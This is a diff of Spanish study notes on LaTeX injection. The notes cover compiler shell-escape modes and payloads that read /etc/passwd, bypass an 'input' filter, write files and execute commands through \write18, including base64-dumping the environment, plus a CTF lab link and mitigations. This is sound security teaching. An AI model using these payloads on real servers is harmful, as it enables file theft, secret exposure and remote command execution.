@@ -1,53 +1,53 @@
+# Inyección LaTeX (LaTeX Injection)
+
+LaTeX es un sistema de composición tipográfica muy usado en publicaciones académicas y científicas. Algunas aplicaciones web permiten a los usuarios escribir texto en formato LaTeX para generar PDFs u otros documentos.
+
+Si el servidor procesa ese input sin sanitizarlo, un atacante puede inyectar comandos LaTeX para **leer archivos del sistema** o **ejecutar comandos** en el servidor.
+
+> Esta vulnerabilidad solo existe en aplicaciones que integran un compilador LaTeX en el backend (ej. `pdflatex`, `xelatex`, `lualatex`).
+
 ---
-tags:
-  - Web
-  - Explotacion
-  - LaTex
+
+## Modos de ejecución del compilador
+
+El nivel de riesgo depende de cómo está configurado el compilador:
+
+| Flag | Descripción |
+|---|---|
+| `-no-shell-escape` | Deshabilita `\write18`. Es el modo más seguro. |
+| `-shell-restricted` | Permite solo un conjunto limitado de comandos predefinidos. |
+| `-shell-escape` | Habilita `\write18` completamente — **ejecuta cualquier comando shell**. |
+
 ---
 
-# Notas
+## Lectura de archivos
 
-http://salmonsec.com/cheatsheets/exploitation/latex_injection
-
-Estas vulnerabilidades solo están en las páginas webs que integran la creación de documentos mediante LaTeX.
-
-Para vulnerar estas web podemos realizar lo siguiente:
-
-**PODEMOS BUSCAR EN INTERNET POR LATEX INJECTION PARA BUSCAR PAYLOADS**
-
-Formas de que se ejecuta LaTeX:
-- -no-shell-escape
-	- Deshabilitar la construcción \write18{command}, incluso si está habilitado en el archivo texmf.cnf
-- -shell-restricted
-	- Igual que x, pero limitado a un conjunto «seguro» de comandos predefinidos
-- -shell-escape
-	- Habilita la construcción \write18{command}. El comando puede ser cualquier comando del shell. Esta construcción normalmente no está permitida por razones de seguridad.
-
-
-## Leer archivos
-
+### Método directo
 
 ```latex
 \input{/etc/passwd}
-\include{somefile} # load .tex file (somefile.tex)
+\include{/etc/hosts}
 ```
 
-Es esto puede que no funcione porque este sanitizado las palabras `input` e `inclide`.
+Si `input` o `include` están filtradas, intentar con definiciones personalizadas:
 
+```latex
+\def\first{in}
+\def\second{put}
+\first\second{/etc/passwd}
+```
 
-
-**Leer por una sola linea**
+### Lectura línea a línea
 
 ```latex
 \newread\file
-\openin\file=/etc/issue
+\openin\file=/etc/passwd
 \read\file to\line
 \text{\line}
 \closein\file
 ```
 
-
-**Leer múltiples lineas**
+### Lectura de múltiples líneas (bucle)
 
 ```latex
 \newread\file
@@ -59,74 +59,72 @@ Es esto puede que no funcione porque este sanitizado las palabras `input` e `inc
 \closein\file
 ```
 
-
-**Leer el texto manteniendo el formato**
+### Lectura con formato preservado
 
 ```latex
 \usepackage{verbatim}
 \verbatiminput{/etc/passwd}
 ```
 
-## Write File
+---
+
+## Escritura de archivos
 
 ```latex
 \newwrite\outfile
-\openout\outfile=cmd.tex
-\write\outfile{Hello-world}
+\openout\outfile=output.tex
+\write\outfile{contenido a escribir}
 \closeout\outfile
-
 ```
 
-## Command Execution
+---
 
-La entrada del comando será redirigida a stdin, utilice un archivo temporal para obtenerla.
+## Ejecución de comandos (si `shell-escape` está activo)
+
+La construcción `\write18{}` permite ejecutar comandos del sistema operativo:
 
 ```latex
-\immediate\write18{id > outpu}
-\input{output}
+\immediate\write18{id > output.tex}
+\input{output.tex}
 ```
 
-Si obtiene algún error LaTex, considere la posibilidad de utilizar base64 para obtener el resultado sin caracteres erróneos
-
+Si el output contiene caracteres problemáticos para LaTeX, exfiltrar en Base64:
 
 ```latex
-\immediate\write18{env | base64 > test.tex}
-\input{text.tex}
+\immediate\write18{id | base64 > output.tex}
+\input{output.tex}
 ```
 
-
 ```latex
-\input|ls|base4
+\immediate\write18{env | base64 > output.tex}
+\input{output.tex}
+```
+
+**Con pipes directos:**
+```latex
+\input|"id"
 \input{|"/bin/hostname"}
+\input|"ls | base64"
 ```
 
-## Mostrar palabras sanitizadas
+---
 
-En el caso de que la palabra `input` este sanitizada haremos lo siguiente:
+## Payloads adicionales
 
-```latex
-\def\first{in}
-\def\second{put}
-\first\second
-```
+Referencia completa de payloads: [http://salmonsec.com/cheatsheets/exploitation/latex_injection](http://salmonsec.com/cheatsheets/exploitation/latex_injection)
 
-# Hack4u
+---
 
-Las **inyecciones LaTeX** son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar **texto formateado** en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.
+## Laboratorio para practicar
 
-Los ataques de inyección LaTeX ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para aprovechar vulnerabilidades en la aplicación y **ejecutar código malicioso** en el servidor.
+- **Internetwache CTF 2016 — Web90**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
 
-Un ejemplo de una inyección LaTeX podría ser un ataque que aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red.
+---
 
-Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.
+## Mitigaciones
 
-También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el uso de LaTeX y cómo evitar la introducción de código malicioso.
-
-A continuación, se os proporciona el enlace correspondiente al proyecto de Github que nos descargamos para desplegar un laboratorio vulnerable donde poder practicar esta vulnerabilidad:
-
-- **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
-# Laboratorios
-
-A continuación, se os proporciona el enlace correspondiente al proyecto de Github que nos descargamos para desplegar un laboratorio vulnerable donde poder practicar esta vulnerabilidad:
-
-- **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
+- Compilar con `-no-shell-escape` siempre (nunca `-shell-escape` en producción)
+- Sanitizar el input: eliminar o escapar `\`, `{`, `}`, `$`, `%`, `#`, `_`, `^`, `~`
+- Ejecutar el compilador en un entorno aislado (contenedor Docker sin acceso a la red ni a archivos del sistema)
+- Usar una lista blanca de comandos LaTeX permitidos
+- No exponer los archivos generados en rutas predecibles
